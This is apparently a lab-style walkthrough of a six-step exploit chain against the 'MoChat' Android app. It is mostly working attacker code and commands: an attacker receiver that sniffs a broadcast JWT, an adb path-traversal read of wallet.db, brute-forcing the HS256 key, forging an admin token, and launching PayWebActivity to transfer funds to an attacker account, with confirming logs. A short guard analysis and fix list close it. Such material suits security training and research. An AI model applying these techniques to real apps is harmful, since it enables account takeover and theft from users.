# Chain 06 — Broadcast Token Leak → JWT Forge → ATO

## Overview

| Field | Value |
|-------|-------|
| **Category** | receiver + storage + network |
| **Difficulty** | INSANE |
| **Steps** | 6 |
| **Components crossed** | TokenReceiver → PrefStore → PayWebActivity |
| **Modern Android** | Fully exploitable (Android 13-16) |
| **decx shape** | broadcast intercept → secret harvest → weak-key crack → token forge → privileged webview |

## Vulnerable surface

- `TokenReceiver` (exported) — broadcasts the live JWT on `com.mochat.app.action.TOKEN_BROADCAST`
- `FileBackupProvider` (authority `com.mochat.app.backup`) — traversal reads `wallet.db`
- `wallet.db` `keys` table — `WALLET_KEY` reused as the HS256 signing key (weak)
- JWT uses HS256 with a low-entropy key derivable from the leaked XOR key
- `PayWebActivity` (exported) — accepts caller-supplied `Authorization` header extra

## Step-by-step exploit

### ① Register a receiver for com.mochat.app.action.TOKEN_BROADCAST

```xml
<!-- attacker AndroidManifest.xml -->
<receiver android:name=".TokenSniffer" android:exported="true">
  <intent-filter>
    <action android:name="com.mochat.app.action.TOKEN_BROADCAST" />
  </intent-filter>
</receiver>
```

### ② Intercept the JWT from the 'token' extra

```java
public class TokenSniffer extends BroadcastReceiver {
  @Override public void onReceive(Context ctx, Intent intent) {
    String jwt = intent.getStringExtra("token");
    // exfiltrate: jwt = eyJhbGciOiJIUzI1NiJ9.<payload>.<sig>
  }
}
```

Or via the shell:

```bash
adb shell am broadcast -a com.mochat.app.action.TOKEN_BROADCAST -n com.mochat.app/.auth.TokenReceiver
# (the receiver also echoes the current token back; or wait for the periodic broadcast)
```

### ③ Read WALLET_KEY from wallet.db via FileBackupProvider traversal

```bash
adb shell content read --uri "content://com.mochat.app.backup/..%2Fdatabases%2Fwallet.db" > wallet.db
sqlite3 wallet.db "SELECT v FROM keys WHERE k='WALLET_KEY';"
# -> WALLET_KEY = MoChat!
```

### ④ Crack the HS256 signature (weak key = XOR key)

The app reuses `WALLET_KEY` as the JWT HS256 secret. Verify directly:

```python
import jwt
# Grab the intercepted JWT (header.payload.sig) and brute force over candidate keys
# recovered from the device (WALLET_KEY, MASTER_PIN, app secrets).
for cand in ["MoChat!", "MoChat", "mochat-secret"]:
    try:
        jwt.decode(jwt_token, cand, algorithms=["HS256"])  # succeeds for MoChat!
        print("key:", cand); break
    except jwt.InvalidSignatureError:
        pass
```

### ⑤ Forge a JWT with role=admin and user_id=u_attacker

```python
forged = jwt.encode(
    {"user_id": "u_attacker", "role": "admin", "exp": 9999999999},
    "MoChat!",
    algorithm="HS256"
)
```

### ⑥ Load PayWebActivity with forged Authorization header → account takeover

```bash
adb shell am start -n com.mochat.app/.pay.PayWebActivity \
  --es url "https://pay.mochat.app/transfer" \
  --es authorization "Bearer ${FORGED_JWT}" \
  --es to "attacker_acc_777" --el amount 9999999
```

**logcat confirms**:

```
PayWebActivity: GET https://pay.mochat.app/transfer hdr=Authorization: Bearer eyJ...role=admin
PayWebActivity: server=200 transfer_id=TR-9B3F to=attacker_acc_777 amount=9999999
```

## Guard analysis

| Guard | Status |
|-------|--------|
| TokenReceiver broadcast permission | absent (exported, any app receives) |
| JWT in TOKEN_BROADCAST | cleartext, full token shipped |
| FileBackupProvider path filter | absent (traversal reaches wallet.db) |
| JWT signing key strength | broken (reused WALLET_KEY, low entropy) |
| PayWebActivity Authorization source | caller-controlled extra, trusted |
| PayWebActivity caller check | absent (exported, accepts header) |

## Impact

Full account takeover. Attacker combines a leaked JWT with a weakly-keyed HS256 secret to
forge an admin token and load the exported PayWebActivity with the forged `Authorization`
header. Server-side checks pass because the signature is valid, enabling arbitrary transfers,
configuration changes, and any admin-gated operation against any victim account.

## Fix

- Do not broadcast JWTs; if a system broadcast is required, use a signature-level permission
  and only ship opaque refresh tokens, never bearer access tokens.
- Use an asymmetric signing algorithm (RS256/EdDSA); never reuse a DB-stored key as the HS256
  secret. Generate a CSPRNG key and rotate it.
- `FileBackupProvider.openFile` must canonicalize and contain paths to the backup root.
- `PayWebActivity` must derive its Authorization header from the app's own session store,
  never from a caller-supplied extra.
- Make `PayWebActivity` non-exported; require a custom signature permission on any exported
  payment entry point.
